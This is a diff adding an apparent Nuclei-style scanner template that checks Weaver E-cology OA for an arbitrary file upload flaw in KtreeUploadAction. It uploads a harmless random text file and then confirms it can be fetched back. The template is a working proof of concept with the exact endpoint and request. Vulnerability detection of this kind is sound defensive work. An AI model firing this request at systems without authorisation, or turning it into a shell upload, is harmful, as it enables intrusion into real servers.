@@ -1,0 +1,55 @@
+id: poc-yaml-weaver-e-cology-ktreeuploadaction-anyfile-upload
+info:
+  name: 泛微OA E-cology KtreeUploadAction 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload,e-cology
+
+variables:
+  t1: '{{rand_base(4)}}'
+  t2: '{{base64(t1)}}'
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - '{{BaseURL}}/weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image'
+    headers:
+      Content-Type: multipart/form-data; boundary=--------1638451160
+    body: |-
+      ----------1638451160
+      Content-Disposition: form-data; name="test"; filename="{{t1}}.txt"
+      Content-Type: application/octet-stream
+
+      {{t2}}
+      ----------1638451160--
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "SUCCESS"
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        part: body
+        name: uploaded_path
+        group: 1
+        regex:
+          - "url':'/(.*?).txt"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - '{{BaseURL}}/{{uploaded_path}}.txt'
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{{t2}}'
+      - type: status
+        status:
+          - 200
